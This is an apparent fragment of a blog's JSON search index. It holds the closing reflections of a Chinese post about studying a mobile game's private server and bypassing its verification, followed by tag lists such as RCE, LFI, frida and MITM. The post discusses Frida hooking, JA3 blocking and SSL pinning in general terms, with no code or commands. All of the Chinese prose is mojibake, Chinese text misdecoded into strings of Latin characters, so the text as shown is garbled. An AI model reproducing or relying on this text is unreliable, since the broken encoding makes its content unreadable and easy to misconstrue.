æ„Ÿæƒ³:å¤§å¹´ä¸‰åæ™šä¸Šçœ‹åˆ°äº†è¿™æ¬¾æ¸¸æˆçš„ç§æœï¼Œç„¶åæˆ‘å°±æ¥äº†å…´è¶£ï¼Œæƒ³ç ”ç©¶ä¸€ä¸‹ï¼Œæ²¡æƒ³åˆ°ä¸€ç ”ç©¶å°±ç ”ç©¶äº†åå‡ å¤©ï¼Œå› ä¸ºä¸ä¼šé€†å‘ï¼Œè¸©äº†ä¸å°‘å‘ï¼Œä¸è¿‡ä¹Ÿå› æ­¤å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼ŒåŒ…æ‹¬å®‰å“çš„ä¸€äº›æœºåˆ¶ï¼Œä¹Ÿè‡ªå·±ç¨å¾®å­¦äº†ä¸€äº›frida hookçš„æŠ€å·§ï¼Œä¹Ÿè®¤è¯†äº†ä¸€äº›u3då¼•æ“åˆ¶ä½œçš„æ¸¸æˆæ–‡ä»¶çš„ç»“æ„ï¼Œè§è¯†åˆ°äº†ç°åœ¨ä¸»æµçš„ä¸€äº›é˜²å¾¡æ‰‹æ®µï¼ŒåŒ…æ‹¬JA3 æ‹¦æˆªï¼ˆå¦‚æœæœ‰å¸ˆå‚…å¯¹JA3æ‹¦æˆªæ„Ÿå…´è¶£çš„è¯ï¼Œæˆ‘ä¼šå†™ç¯‡æ–‡ç« è·Ÿå¸ˆå‚…ä»¬ä¸€èµ·è®¨è®ºçš„qwqï¼‰ï¼Œssl pinningç­‰ åœ¨ç ”ç©¶è¿™äº›åŸç†ä¹‹åï¼Œæˆ‘æ„Ÿè§‰CTFå’Œç°å®çš„å·®è·çœŸçš„æŒºå¤§çš„ï¼Œæ‰“CTFï¼Œå‡ºé¢˜äººä¸ºäº†æ¶å¿ƒä½ å¯ä»¥å•¥å¥‡æ€ªçš„æ‰‹æ®µéƒ½ç”¨ä¸Šï¼Œä½†æ˜¯åœ¨ç°å®ç”Ÿæ´»ä¸­ï¼Œè¿˜éœ€è¦è€ƒè™‘åˆ°ç”¨æˆ·çš„ä½¿ç”¨ä½“éªŒï¼Œè€Œåœ¨è¿™æ–¹é¢ï¼Œå®‰å…¨æ€§ä¸å¯ç”¨æ€§çš„å¹³è¡¡æ˜¯é˜²å®ˆæ–¹éœ€è¦æ·±æ€ç†Ÿè™‘çš„åœ°æ–¹ï¼Œå°±æ¯”å¦‚u3dçš„æ ¸å¿ƒlib2cpp.soï¼ŒCTFå¯èƒ½ä¼šç›´æ¥æŠŠbuffåŠ æ»¡ï¼Œå•¥vmpï¼Œå•¥åè°ƒè¯•éƒ½ç»™å®‰æ’ä¸Šï¼Œä½†å®é™…æƒ…å†µå¯èƒ½æ˜¯åŠ äº†è¿‡å¤šçš„ä¿æŠ¤ä¼šé™ä½æ¸¸æˆæ€§èƒ½ï¼Œé˜²å®ˆæ–¹æ›´å¤šçš„åˆ™æ˜¯é€šè¿‡ä¸€äº›æ‰‹æ®µæ¥å¢åŠ ç ´è§£çš„å¤æ‚ç¨‹åº¦ï¼Œæ¯”å¦‚æŠŠå…³é”®æ–‡ä»¶è¿›è¡Œä¸€äº›åç§»æˆ–è€…å¼‚æˆ–ä¹‹ç±»çš„æ‰‹æ®µï¼Œæˆ–è€…æ˜¯æ•´ç‚¹åå¸¸è¯†çš„æ‰‹æ®µæ¥è¯¯å¯¼æ”»å‡»è€…â€¦ æŒºæœ‰è¶£çš„qwq","link":"/2023/02/15/%E6%9F%90%E6%B8%B8%E7%A7%81%E6%9C%8D%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E8%BF%87%E9%AA%8C%E8%AF%81/"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"WEB","slug":"WEB","link":"/tags/WEB/"},{"name":"ETH","slug":"ETH","link":"/tags/ETH/"},{"name":"Solidity","slug":"Solidity","link":"/tags/Solidity/"},{"name":"upload","slug":"upload","link":"/tags/upload/"},{"name":"Crypto","slug":"Crypto","link":"/tags/Crypto/"},{"name":"XOR","slug":"XOR","link":"/tags/XOR/"},{"name":"RCE","slug":"RCE","link":"/tags/RCE/"},{"name":"å¤ç°","slug":"å¤ç°","link":"/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"phar","slug":"phar","link":"/tags/phar/"},{"name":"web","slug":"web","link":"/tags/web/"},{"name":"inject","slug":"inject","link":"/tags/inject/"},{"name":"Hexo","slug":"Hexo","link":"/tags/Hexo/"},{"name":"Troubleshooting","slug":"Troubleshooting","link":"/tags/Troubleshooting/"},{"name":"SQL","slug":"SQL","link":"/tags/SQL/"},{"name":"å¤‡å¿˜å½•","slug":"å¤‡å¿˜å½•","link":"/tags/%E5%A4%87%E5%BF%98%E5%BD%95/"},{"name":"Blockchain","slug":"Blockchain","link":"/tags/Blockchain/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"ssti","slug":"ssti","link":"/tags/ssti/"},{"name":"LFI","slug":"LFI","link":"/tags/LFI/"},{"name":"javascript","slug":"javascript","link":"/tags/javascript/"},{"name":"frida","slug":"frida","link":"/tags/frida/"},{"name":"MITM","slug":"MITM","link":"/tags/MITM/"}],"categories":[{"name":"å¤‡å¿˜å½•","slug":"å¤‡å¿˜å½•","link":"/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"},{"name":"å¤ç°","slug":"å¤ç°","link":"/categories/%E5%A4%8D%E7%8E%B0/"},{"name":"ssti","slug":"ssti","link":"/categories/ssti/"},{"name":"è·¯ç”±å™¨","slug":"è·¯ç”±å™¨","link":"/categories/%E8%B7%AF%E7%94%B1%E5%99%A8/"},{"name":"weak","slug":"weak","link":"/categories/weak/"}]}